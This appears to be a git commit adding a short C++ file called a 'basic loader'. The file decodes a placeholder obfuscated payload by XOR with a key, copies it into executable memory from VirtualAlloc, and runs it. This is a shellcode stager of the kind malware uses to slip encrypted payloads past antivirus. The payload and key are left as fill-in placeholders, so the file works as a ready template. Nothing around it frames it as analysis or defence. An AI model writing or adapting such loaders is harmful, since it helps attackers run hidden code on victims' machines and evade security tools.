b06e09ef6c995daabdbba1f6c1d8439863302e48
ronkonis <ronkonis1@gmail.com>
2022-08-19 15:13:51 +0300

    added basic loader

---
+++ main.cpp
@@ -0,0 +1,25 @@
+﻿#include <iostream>
+#include <windows.h>
+
+int main(int argc, char** argv)
+{
+	const std::string KEY = "<your key goes here>";
+
+	char b[] = { <your obfuscated payload goes here> };
+	char c[sizeof(b)] = { 0 };
+
+	for (int i = 0; i < sizeof(b); i++)
+	{
+		c[i] = b[i] ^ KEY[i % KEY.size()];
+	}
+
+	void* exec = VirtualAlloc(0, sizeof(c), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	std::memcpy(exec, c, sizeof(c));
+
+	((void(*)())exec)();
+
+	VirtualFree(exec, 0, MEM_RELEASE);
+
+	return 0;
+}
